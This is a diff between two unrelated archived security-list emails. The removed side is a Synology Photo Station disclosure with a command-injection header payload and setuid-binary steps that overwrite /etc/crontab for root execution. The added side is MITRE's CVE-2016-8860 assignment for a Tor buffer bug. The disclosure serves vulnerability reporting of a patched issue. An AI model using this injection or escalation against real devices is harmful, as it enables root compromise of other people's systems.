@@ -1,80 +1,68 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/01/28/7
-Message-ID: <3AE6A5EB7FBC894F91BF6F1F3B80613B0121FFFCB8@adcexmbx03.tw.trendnet.org>
-Date: Thu, 28 Jan 2016 06:31:46 +0000
-From: "lucas_leong@...nd.com.tw" <lucas_leong@...nd.com.tw>
-To: "cve-assign@...re.org" <cve-assign@...re.org>
-CC: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
-Subject: CVE request: Synology Photo Station command injection and privilege escalation
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/10/19/11
+Message-Id: <20161019213549.6A26D52E018@smtpvbsrv1.mitre.org>
+Date: Wed, 19 Oct 2016 17:35:49 -0400 (EDT)
+From: cve-assign@...re.org
+To: jmm@...ian.org
+Cc: cve-assign@...re.org, oss-security@...ts.openwall.com
+Subject: Re: CVE request for tor
 Content-Type: text/plain; charset=utf-8
 
-Title: Synology Photo Station command injection and privilege escalation
-Vendor: Synology (https://www.synology.com/)
-Product: Photo Station
-Status: Patch released
-Affected: version <= 6.3-2954
-Impact: Any guest account can execute arbitrary command with root permission
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
 
+> https://blog.torproject.org/blog/tor-0289-released-important-fixes
+> https://github.com/torproject/tor/commit/3cea86eb2fbb65949673eb4ba8ebb695c87a57ce
+> https://trac.torproject.org/projects/tor/ticket/20384
 
+> Tor 0.2.8.9 backports a fix for a security hole in previous versions
+> of Tor that would allow a remote attacker to crash a Tor client,
+> hidden service, relay, or authority.
 
-Vulnerability 1: Command injection
+> Prevent a class of security bugs caused by treating the contents of a
+> buffer chunk as if they were a NUL-terminated string. At least one
+> such bug seems to be present in all currently used versions of Tor,
+> and would allow an attacker to remotely crash most Tor instances,
+> especially those compiled with extra compiler hardening. With this
+> defense in place, such bugs can't crash Tor, though we should still
+> fix them as they occur. Closes ticket 20384
 
-The vulnerability is in appstore/PhotoStation/photo/login.php
+> Add a one-word sentinel value of 0x0 at the end of each buf_t chunk
+> 
+> This helps protect against bugs where any part of a buf_t's memory
+> is passed to a function that expects a NUL-terminated input.
 
-118     if ($x_forward) {
-119         $ip = $x_forward;
-120     }
-...
-176     $commend = "/usr/syno/bin/synoautoblock --reset \"".$ip."\"";
-177     @system($commend, $retval);
+Here, we will assign the ID to the broadest possible interpretation of
+the issue, which perhaps can be restated as "Tor internal functions
+were entitled to expect that buf_t data had NUL termination, but the
+implementation of or/buffers.c did not ensure that NUL termination was
+present."
 
-Since, the page did not filter X-Forwarded-For header and lead to command injection
-After sending a crafted header, a command is executed under http permission
+Use CVE-2016-8860.
 
-X-Forwarded-For: ";id>/tmp/hack;"
+With this CVE, any related "we should still fix them as they occur"
+patches can most likely be treated as defense-in-depth changes, and
+won't require separate CVE IDs.
 
-> cat /tmp/hack
-uid=1023(http) gid=1023(http) groups=1023(http)
+- -- 
+CVE Assignment Team
+M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
+[ A PGP key is available for encrypted communications at
+  http://cve.mitre.org/cve/request_id.html ]
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
 
-
-
-Vulnerability 2: Privilege escalation
-
-For the privilege escalation vulnerability, it is a simple setuid problem.
-
-> ls -al /usr/syno/bin/synophoto_dsm_user
-lrwxrwxrwx    1 root     root            56 Sep 16 22:53 /usr/syno/bin/synophoto_dsm_user -> /var/packages/PhotoStation/target/bin/synophoto_dsm_user
-> ls -al /var/packages/PhotoStation/target/bin/synophoto_dsm_user
--rwsr-xr-x    1 root     root         30520 Jul  6 19:55 /var/packages/PhotoStation/target/bin/synophoto_dsm_user
-> ls -al /tmp/hack2
--rw-rw-rw-    1 http     http            15 Sep 23 00:24 /tmp/hack2
-> cat /tmp/hack2
-pwned by lucas
-> ls -al /etc/crontab
--rw-r--r--    1 root     root           404 Aug 27 13:25 /etc/crontab
-> synophoto_dsm_user --copy-no-ea /tmp/hack2 /etc/crontab
-> cat /etc/crontab
-pwned by lucas
-
-After overwritng crontab, arbitrary process can be executed with root permission
-
-
-Patch:
-Vendor released the patch and the issue has solved in 6.3-2958
-https://www.synology.com/en-us/releaseNote/PhotoStation
-
-Timeline:
-2015/09/23         Vendor Notified
-2015/10/01         Patch Released
-
-
-
-<table class="TM_EMAIL_NOTICE"><tr><td><pre>
-TREND MICRO EMAIL NOTICE
-The information contained in this email and any attachments is confidential 
-and may be subject to copyright or other intellectual property protection. 
-If you are not the intended recipient, you are not authorized to use or 
-disclose this information, and we request that you notify us by reply mail or
-telephone and delete the original message from your mail system.
-</pre></td></tr></table>
-
+iQIcBAEBCAAGBQJYB+XHAAoJEHb/MwWLVhi2sBMP+wRQ7PiGfYaTU0Cym1dNAYpJ
+cXF5FHCE+wIRIzBh4DxPPPm/335kM4iLd/4mTL0Tt6OXRbqxHBcaGQlcEhchW4YH
+YCoTVuKDZDXo9OD1AaJtWVcV0b8AYk+H0uGCMarvnSiuO5b+149DQiFaSxE9ORVx
+z2c+2GzAXm+rI1kEfRVh/Ak1sVyW6fLh1zazMObvdrvEJutSJw9iVI8/hO6mgQ3I
+EMaqg4WjVdWuEcAfEDmqRT//AF41QsYUYQ916BluCNoMATqGT38IsU5a5ESScTi3
+P5cnEG0fn2KbXYbP449vLhyEOPzS/O/yZDcpiGmgn+Sr8znggwPoetVQ3C84jjVb
+FeyhMRwzEd+ugiSxSeGTja9sDGRugtkcR0XAsMEOn/0qnCTRPK2iTxq3EGt+F7lC
+4swukuQ6rJDY3qmn+7y8eUthu9Y87qwzsEd8l1WomtGLnyErEiolrJO7JngXYQuc
+IEZpoqvmonZd8WPOr4doMH9TT6ybpW7thA+DY1gt0EgsiYaITe9u6c7kcjkhR/5C
+9nda+YakEjAM6r/W0S3Xvo1iJ+k1ar5ZX37o5H/UqMFVtJqs5G8/d6Nejqn9ZiHJ
+m1hdRYbe2Pr0n2gZg1POhYs8JogcqXw6eTYJIAtKy1ssHKU0WnP5YRDiQ1wKWk3g
+RTr0TaPl+xvXHMUq+mxr
+=yC51
+-----END PGP SIGNATURE-----
